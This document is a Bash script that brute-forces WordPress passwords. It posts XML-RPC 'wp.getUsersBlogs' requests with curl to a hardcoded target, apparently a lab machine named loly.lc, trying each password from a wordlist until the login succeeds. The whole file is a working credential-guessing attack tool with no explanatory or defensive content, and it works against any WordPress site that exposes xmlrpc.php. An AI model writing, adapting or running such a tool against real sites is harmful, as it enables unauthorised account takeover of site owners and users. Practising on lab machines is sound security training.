#!/bin/bash

#colors
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"

# Function to handle Ctrl+C interrupt
function ctrl_c() {
    echo -e "\n\n${redColour}Exiting...${endColour}\n"
    rm data.xml 2>/dev/null
    tput cnorm; exit 1
}

trap ctrl_c SIGINT

# Function to display help panel
function helpPanel() {
    echo -e "\n${yellowColour}[+]Usage: $0 -u <username> -w <wordlist>${endColour}\n"
    echo -e "\t-u: Username to brute force."
    echo -e "\t-w: Wordlist to use.\n"
    tput cnorm; exit 1
}

# Function to create XML payload and send requests
function makeXML () {
    username=$1
    wordlist=$2
    
    while IFS= read -r password; do
        xml=$(cat <<EOF
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param>
                    <value> $username </value>
                </param>
                <param>
                    <value> $password </value>
                </param>
            </params>
        </methodCall>
EOF
)
        echo -e "$xml" > data.xml
        response=$(curl -s -X POST "http://loly.lc/wordpress/xmlrpc.php" -d @data.xml)

        if ! echo "$response" | grep -q -E 'Incorrect username or password\.|parse error\. not well formed'; then
            echo -e "[+]Password is:${greenColour} $password ${endColour}"
            rm data.xml 2>/dev/null
            tput cnorm && exit 0
        fi

    done < "$wordlist" #redirection of the wordlist to the while loop

}

declare -i requiredArgs=0;

tput civis

# Parse command line arguments
while getopts "u:w:h" opt; do
    case $opt in
        u) username=$OPTARG requiredArgs+=1;;
        w) wordlist=$OPTARG requiredArgs+=1;;
        h) helpPanel;;
        \?) echo "Invalid option: $OPTARG" 1>&2 
            exit 1;;
    esac
done

# Check if all required arguments are provided
if [ $requiredArgs -ne 2 ]; then
        helpPanel
    else
        if [ -f "$wordlist" ]; then
            echo -e "\n${yellowColour}Brute forcing user: ${endColour}${blueColour}$username${endColour}"
            echo -e "${yellowColour}Using wordlist: ${endColour}${blueColour}$wordlist${endColour}\n"
            makeXML "$username" "$wordlist"
        else
            echo -e "\n${redColour}[-] Wordlist not found.${endColour}\n"
            exit 1
        fi
fi

rm data.xml 2>/dev/null
tput cnorm
